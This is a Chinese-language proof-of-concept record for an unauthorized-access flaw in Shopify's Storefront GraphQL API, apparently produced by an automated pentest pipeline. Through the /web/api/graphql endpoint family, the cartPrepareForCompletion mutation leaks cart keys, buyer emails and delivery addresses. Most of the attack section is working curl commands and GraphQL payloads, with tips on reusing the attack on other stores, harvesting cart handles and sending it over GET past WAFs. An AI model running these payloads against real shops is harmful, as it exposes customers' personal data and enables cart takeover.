# Shopify /web/api/graphql 入口族（含 {2023-01…2026-01}/graphql、graphql.json 与 GET 裸载 mutation）与 /api/graphql 同一 Storefront schema：cartPrepareForCompletion 裸 handle 泄露 cart key+email+收货地址

- **code**: shopify-web-api-graphql-与-api-graphql-同一-storefront-schema
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify Storefront API（/web/api/graphql + /web/api/{date}/graphql + /web/api/graphql.json 入口族）
- **severity**: high
- **language**: markdown
- **source**: manual
- **verified**: 1
- **verified_note**: 2026-11-11 实测 retro-refresh.com（多批独立复现，均零 Cookie / 零 Authorization / 零 x-checkout-one-session-token / 零 build-id）：
① 原路径验证：零凭据 introspection 两入口均 30 query/41 mutation 且差集为空；自建合成 cart 仅凭裸 handle 调 cartPrepareForCompletion 回显真实 ?key=514e0d72... 与 buyerIdentity.email=i2968-victim3@example.com，错 key 同样回显另一 cart 的真实 key 94e97679... + 5 Victim Way/London/SW1A 3AA/07911 123456；用回显 key 调 cartNoteUpdate/cartDeliveryAddressesAdd 均 userErrors=[] 并真实改状态；对照写 mutation 裸/错 key → INVALID "The specified cart does not exist."；submit 在该 web 路由恒 404。
② finding#174（i3070）新入口族：POST /web/api/2023-01/graphql → 200，x-shopify-api-version: 2026-01，回显 ?key=<REDACTED>、buyerIdentity.email=i3070-synth@example.com、delivery.addresses=[i3070 Synth / 1 Test Lane / London / SW1A 1AA / GB / 07911000000]；/web/api/{2024-01,2024-10,2025-04,unstable}/graphql 与 /web/api/graphql.json 同样命中；GET /web/api/graphql?query=...&variables=... 与 POST 正文逐字相同（Cdn-Cache-Control: no-cache, no-store / Cf-Cache-Status: DYNAMIC）；/web/api/banana/graphql → 404；阴性对照 cart(id:裸 handle) → email=null、addresses=[]。
原始响应落盘 /opt/artex/data/tasks/9/i3070/，本轮已核验 phase3/u4_ver2023_prepare.resp.json 与 v4_get_prepare.resp.json 确实含上述 key+email+地址回显。
- **path**: pocs/shopify-web-api-graphql-与-api-graphql-同一-storefront-schema/poc.md
- **tags**: shopify, storefront, graphql, cart, idor, unauthorized, pii, delivery-address, prepare-for-completion, web-api-channel, version-alias, entrypoint-enum, get-method, api-version-flattening
- **created_at**: 2026-11-11T21:32:38.816Z
- **engine**: https://retro-refresh.com/web/api/graphql

## 描述

Shopify 店铺除 /api/graphql 外还有 /web/api/graphql 路由，schema 完全相同（同一 Storefront API channel）；且该路由的版本别名族 /web/api/{2023-01,2024-01,2024-10,2025-04,2026-01,unstable}/graphql 与 /web/api/graphql.json 也都是真实入口（dated 段被服务端压平为 2026-01），GET 亦可承载 mutation。其读路径 cartPrepareForCompletion 不校验 cart GID 的 ?key，裸 25 位 handle 即回显真实 ?key、buyerIdentity.email 与全量收货地址，可再用回显 key 跨会话写 cart；写 mutation 逐项强制 key，submit 在该路由恒 404。用于其他 Shopify 目标：先探该入口族是否匿名可达，再按三态（裸/错/正确 key）区分「读泄露」与「写门禁」。

## 用法

```
前置：Shopify 托管店，已知目标 cart 的 25 位 handle（108bit 随机、不可枚举，来源：分享的 cart/checkout 链接、Referer、页面 JS ShopifyAnalytics.meta.cart.id 等）；零 Cookie / 零 Authorization / 零 x-checkout-one-session-token / 零 build-id；单线程、间隔≥3s。

# 0) 探入口族（POST {"query":"{__typename}"} 即可）
#    /web/api/graphql、/web/api/graphql.json、/web/api/{2023-01,2024-01,2024-10,2025-04,2026-01,unstable}/graphql
#    判据：200 且 data.__typename=QueryRoot；dated 段的 x-shopify-api-version 一律回 2026-01（压平），unstable 回 unstable；/web/api/banana/graphql → 404 0B

# 1) 自建合成 cart（POST /web/api/graphql）
curl -sk -X POST 'https://<shop>/web/api/graphql' -H 'Content-Type: application/json' --data '{"query":"mutation Create($input:CartInput!){cartCreate(input:$input){cart{id} userErrors{field message code}}}","variables":{"input":{"note":"SYNTH-CART","buyerIdentity":{"email":"synth@example.com"},"lines":[{"merchandiseId":"gid://shopify/ProductVariant/<variant_id>","quantity":1}]}}}'

# 2) 裸 handle（不带 ?key）打任一别名入口
curl -sk -X POST 'https://<shop>/web/api/2023-01/graphql' -H 'Content-Type: application/json' --data '{"query":"mutation P($id:ID!){cartPrepareForCompletion(cartId:$id){result{__typename ... on CartStatusReady{cart{id note buyerIdentity{email} delivery{addresses{selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}} ... on CartStatusNotReady{cart{id note buyerIdentity{email}}}}}}","variables":{"id":"gid://shopify/Cart/<HANDLE>"}}'

# 3) GET 同构复核（GET 同样承载 mutation 并回显业务数据）
curl -sk -G 'https://<shop>/web/api/graphql' --data-urlencode 'query=mutation P($id:ID!){cartPrepareForCompletion(cartId:$id){result{__typename ... on CartStatusReady{cart{id buyerIdentity{email} delivery{addresses{selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}}}}}' --data-urlencode 'variables={"id":"gid://shopify/Cart/<HANDLE>"}'

# 4) 用回显的真实 key 复测写路径（cartNoteUpdate / cartDeliveryAddressesAdd），userErrors=[] 即跨会话接管成立

判据：cart.id 回显 "?key=<REAL_KEY>" 且 buyerIdentity.email / delivery.addresses 非空；
阴性对照：同入口 cart(id:<裸 handle>){buyerIdentity{email} delivery{addresses{...}}} → email=null、addresses=[]（key 门控）；伪造 Authorization Bearer 空 alg JWT → 401 UNAUTHORIZED；空 x-checkout-one-session-token 不改变结果（该头不参与鉴权）。
常见坑：① 只看 HTTP 200 不够，必须看到 ?key= 非空与 PII 非空；② 版本段不是降级机会，dated 路径仍走 2026-01 schema；③ GET 是敏感读通道，别假设 mutation 只能 POST；④ 即时 GET 也在 Cdn-Cache-Control: no-cache, no-store / Cf-Cache-Status: DYNAMIC，无边缘缓存放大；⑤ 该 web 路由的 cartSubmitForCompletion 恒 404，别误判 cart 失效，换 /api/graphql 复核。
```

## 正文

```
## 判定流程（约 20 个请求，单线程间隔≥2.5s）
1) 零凭据 POST https://<shop>/web/api/graphql {"query":"{__schema{queryType{fields{name}} mutationType{fields{name}}}}"}，与 /api/graphql 同名查询的结果做差集；若两者一致即同一 schema。
2) cartCreate 自建合成 cart 记下 handle；**只用 handle**（不带 key）调：
   mutation{ cartPrepareForCompletion(cartId:"gid://shopify/Cart/<HANDLE>"){ result{ __typename ... on CartStatusNotReady{ cart{ id buyerIdentity{email} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName address1 city zip countryCode phone}}}} } ... on CartStatusReady{ cart{ id buyerIdentity{email} delivery{addresses{address{... on CartDeliveryAddress{firstName address1 city zip countryCode phone}}}} } } } } }
   若 cart.id 回显 "?key=<real_key>" 且 email/地址非空 → 读路径忽略 key（与 api/graphql 的 #652/#1727 同机理）。
3) 再用 ?key=deadbeef... 重跑第 2 步，若同样回显真实 key/PII → 错 key 也被忽略。
4) 用回显 key 做写验证（cartNoteUpdate / cartDeliveryAddressesAdd），userErrors=[] 即跨会话接管成立。
5) 写路径三态矩阵（bare / wrong / right）：裸/错 key 预期 userErrors [{"field":["cartId"],"message":"The specified cart does not exist.","code":"INVALID"}] 并返回新建空白 cart（不是目标 cart）；right 成功。cartDeliveryAddressesUpdate 还会额外 INVALID_DELIVERY_ADDRESS_ID + cart:null。
6) 门禁型 mutation：cartClone / cartPaymentUpdate → ACCESS_DENIED（需 scope）；cartSubmitForCompletion → 该 web 路由对任何 key/attemptToken 恒 HTTP 404 {"code":"NOT_FOUND"}（与 /api/graphql 不同，后者裸 handle 也可 SubmitFailed PAYMENTS_METHOD_REQUIRED）。
7) 敏感查询：customer / node(Order) / cartCompletionAttempt 在无 scope 时均 ACCESS_DENIED（unauthenticated_read_customers / cartCompletionAttemptResult），两入口一致。

## 判据
- 只看"写 mutation 裸 key 成功"会误判阴性：真正的验证链路是 prepare 泄露 key → 再用 key 写。
- 不要把 web 路由的 submit 404 当作"cart 已失效"；换 /api/graphql 复核。

## 入口族补充（2026-11-11 实测，finding#174 / task#9 / i3070）
同一漏洞的更多独立入口（与 /web/api/graphql 同 schema，dated 版本被服务端压平）：
- `/web/api/graphql.json` → 真实入口（POST JSON 行为同 /web/api/graphql）。
- `/web/api/{2023-01,2024-01,2024-10,2025-04,2026-01,unstable}/graphql` → 均为真实入口；dated 段响应头 `x-shopify-api-version` 一律回 `2026-01`（压平，不存在旧版 schema 差异），`unstable` 回 `unstable`。
- `/web/api/banana/graphql` → 404 / 0B（阴性对照）。
- **GET 也可承载 mutation 并回显业务数据**：`GET /web/api/graphql?query=<urlencode mutation>&variables=<json>` → 200，正文与 POST 逐字相同（含真实 ?key、email、收货地址）。
- 缓存头：`Cdn-Cache-Control: no-cache, no-store`、`Cf-Cache-Status: DYNAMIC`（重复 GET 仍 DYNAMIC，无缓存放大）。
- 指纹：`Server-Timing: graphql;desc="storefront/query/anonymous"`、`X-Stats-Apiclientid: 580111`。

### 复现（自建合成 cart，全程无 Cookie / 无 Authorization / 无 x-checkout-one-session-token / 无 build-id）
1) `cartCreate`（POST /web/api/graphql）→ 记录 handle；如需 PII 先 `cartDeliveryAddressesAdd`（带 key）写入测试地址。
2) 裸 handle（不带 ?key）对任一别名入口调 `cartPrepareForCompletion`：
   ```
   POST /web/api/2023-01/graphql
   Content-Type: application/json
   {"query":"mutation P($id:ID!){cartPrepareForCompletion(cartId:$id){result{__typename ... on CartStatusReady{cart{id note buyerIdentity{email} delivery{addresses{selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}} ... on CartStatusNotReady{cart{id note buyerIdentity{email}}}}}}","variables":{"id":"gid://shopify/Cart/<HANDLE>"}}
   ```
   → 200，`cart.id` 回显 `"?key=<REDACTED>"`、`buyerIdentity.email`、`delivery.addresses` 全量（姓名/街道/城市/邮编/国家/电话）。
3) GET 同构请求复核：`GET /web/api/graphql?query=<同上>&variables={"id":"gid://shopify/Cart/<HANDLE>"}` → 200 同正文。
4) 阴性对照：同入口 `cart(id:<裸 handle>){buyerIdentity{email} delivery{addresses{...}}}` → email=null、addresses=[]（key 门控）；伪造空 alg JWT → 401 UNAUTHORIZED；空 `x-checkout-one-session-token` 不改变结果（该头不参与鉴权）。

### 判据与坑
- 只看 HTTP 200 不够：必须看到 `cart.id` 里 `?key=` 非空回显 + email/地址非空。
- 版本段不是降级机会：dated 路径的 `x-shopify-api-version` 仍为 2026-01，别指望旧 schema。
- GET 是敏感读通道：不要把 mutation 当 POST-only，WAF/日志可能放行 GET。
- handle 不可枚举（108bit），需先由分享链接/Referer/页面 JS `ShopifyAnalytics.meta.cart.id` 等渠道取得。
- 本入口族与 /web/api/graphql、/api/graphql 同机理；发现于 retro-refresh.com（task#9 / finding#174），全程只使用自建合成 cart，未接触真实客户数据。

原始响应落盘：`/opt/artex/data/tasks/9/i3070/{phase1,phase2,phase3}/`（关键文件：phase3/u4_ver2023_prepare.resp.json、phase3/v4_get_prepare.resp.json）。
```
